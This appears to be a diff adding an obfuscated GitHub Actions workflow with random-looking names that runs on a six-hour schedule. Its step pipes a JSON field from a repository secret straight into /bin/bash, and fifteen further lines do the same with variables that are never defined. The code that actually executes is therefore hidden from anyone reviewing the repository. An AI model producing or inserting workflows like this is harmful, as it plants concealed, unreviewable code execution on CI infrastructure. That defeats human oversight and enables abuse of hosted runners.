@@ -1,0 +1,33 @@
+name: hongjixiefs
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '15 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: hongjixiefs
+        env:
+          fos97503: ${{ secrets.fos97503 }}
+        run: |
+          echo $fos97503 | jq -r .iacu31903 | /bin/bash
+          echo $aitw671 | jq -r .e6 | /bin/bash
+          echo $jeb630 | jq -r .zz81094 | /bin/bash
+          echo $uz8 | jq -r .esuum32 | /bin/bash
+          echo $dn7892 | jq -r .y035 | /bin/bash
+          echo $atrqw0156 | jq -r .mcgqe5 | /bin/bash
+          echo $mnuq50499 | jq -r .szmig1545 | /bin/bash
+          echo $ztbt35 | jq -r .oa811 | /bin/bash
+          echo $qcfk85537 | jq -r .hjwi713 | /bin/bash
+          echo $zl15463 | jq -r .cgxb97 | /bin/bash
+          echo $tfanj9 | jq -r .ynb79 | /bin/bash
+          echo $yu6 | jq -r .c6423 | /bin/bash
+          echo $dmnhf82038 | jq -r .xbgz8 | /bin/bash
+          echo $rxq656 | jq -r .jlwr77072 | /bin/bash
+          echo $qdy5 | jq -r .tfgnl08431 | /bin/bash
+          echo $vvzil0 | jq -r .cy37 | /bin/bash
+
